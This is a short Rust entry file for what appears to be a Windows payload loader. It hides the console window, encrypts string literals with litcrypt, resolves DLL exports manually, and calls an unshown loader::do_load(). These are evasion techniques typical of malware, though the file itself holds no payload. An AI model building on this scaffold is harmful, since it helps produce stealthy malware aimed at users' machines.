#![cfg_attr(
    all(
      target_os = "windows",
      feature = "no_console",
    ),
    windows_subsystem = "windows"
  )]

use crate::winapi::dll_functions::{get_dll_base_address, get_dll_functions};  

#[macro_use]
extern crate litcrypt;
use_litcrypt!();

mod loader;
mod common;
mod winapi;

fn main() {
    // let dll_name = "advapi32.dll";
    // let base_address = get_dll_base_address(dll_name.to_lowercase().as_str());
    // debug_ok_msg!(format!("Found dll {} at address {:?}", dll_name.to_lowercase().as_str(), base_address as *const u64));

    // let func_res = get_dll_functions(base_address);
    // if func_res.is_err() {
    //     let error = func_res.err().unwrap();
    //     debug_error!("Error ", &error);
    //     return;
    // }
    
    // let functions = func_res.unwrap();
    // for fun_info in functions {
    //     debug_ok_msg!(format!("Found function {} #{} at {:?}", fun_info.name, fun_info.ordinal, fun_info.address as *const u64));
    // }

    loader::do_load();
}